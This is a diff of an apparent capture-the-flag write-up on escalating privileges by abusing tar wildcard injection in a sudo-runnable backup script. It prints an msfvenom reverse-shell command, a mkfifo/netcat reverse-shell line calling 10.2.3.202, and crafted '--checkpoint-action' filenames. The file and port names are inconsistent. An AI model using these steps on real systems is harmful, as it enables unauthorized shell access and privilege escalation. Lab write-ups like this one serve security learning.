@@ -277,51 +277,57 @@ Let's check if user `jake` have any SUDO privileges:
 
 It seems that `jake`, can run the `/opt/backups/backup.sh` file with the perimissions of user `michael`, who is its owner. Upon closer inspection of the file's contents, we can see that this executable is vulnerable to **wildcard injection**. 
 
+![backup-sh-script](backup-sh.png)
+
 Feel free to read this amazing [*Exploiting Wildcard for Privilege Escalation*](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) article to fully grasp the concept of the **wildcard injection**.
 
 This is what `backup.sh` does:
 1. It creates a **tar archive** named `backup.tar`, using the `tar cf /opt/backups/backup.tar` command.
 2. Instead of archiving a specified file, for instance, `tar cf /opt/backups/backup.tar backup.sh`, it uses the wildcard character, `*`, which means that it is archiving all files within the directory.
 
-1. We can generate a payload with `msfvenom` on our machine:
+And here is how we can perform a **wildcard injection**:
+
+1. Generate a payload with `msfvenom`:
 
     ```bash
     msfvenom -p cmd/unix/reverse_netcat LHOST=ATTACKER-IP LPORT=54321 R
     ```
-    Copy the generated payload.
 
     ![msfvenom-payload](msfvenom-payload.jpg)
 
-2. Setup a listener on our local machine:
+2. Setup a listener:
 
     ```bash
     nc -lvnp 54321
     ```
 
-3. We then jump onto SSH, and create a file (`shell.ph`), containing our payload:
+3. Go back to the compromised machine, and create a file, such as `shell.ph`, containing the msfvenom payload:
 
     ```bash
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.3.202 9001 >/tmp/f" > shell.sh
     ```
 
-4. We then do what
+4. Create a file named `--checkpoint-action=exec=sh shell.sh`, which is designed to trick the system as it uses the `--checkpoint-action` flag.
+In this context, it's used to execute the `shell.ph` script when a checkpoint occurs.
 
     ```bash
     echo "" > "--checkpoint-action=exec=sh shell.sh"
     ```
 
-5. We then do what
+5. Create a file named `--checkpoint=1` with the purpose of triggering the above checkpoint.
 
     ```bash
     echo "" > --checkpoint=1
     ```
 
-6. Modify permissions so 
+6. Modify permissions to make the files executable.
+
     ```bash
     chmod 777 backup.tar shell.sh
     ```
 
-7. Run `backup.sh` as user `michael`
+7. Run `backup.sh` as user `michael`, which will 
+
     ```bash
     sudo -u michael /opt/backups/backup.sh
     ```
